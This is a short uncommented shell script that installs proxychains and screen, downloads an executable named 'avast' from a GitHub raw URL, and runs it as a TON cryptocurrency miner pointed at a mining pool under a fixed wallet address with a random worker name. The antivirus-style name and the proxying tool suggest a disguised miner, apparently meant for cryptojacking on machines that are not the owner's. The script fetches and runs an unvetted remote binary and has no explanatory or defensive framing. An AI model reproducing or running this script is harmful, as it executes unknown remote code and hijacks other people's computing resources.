apt update

apt install proxychains

apt install screen -y

wget -q https://raw.githubusercontent.com/renilo/bc/main/avast

chmod +x avast 

WORKER=$(echo $(shuf -i 1-9999999999 -n 1)-HAJAR)

./avast --algo TON --pool ton.de.hashrate.to:4003 --user EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z.$WORKER --ton-mode 6
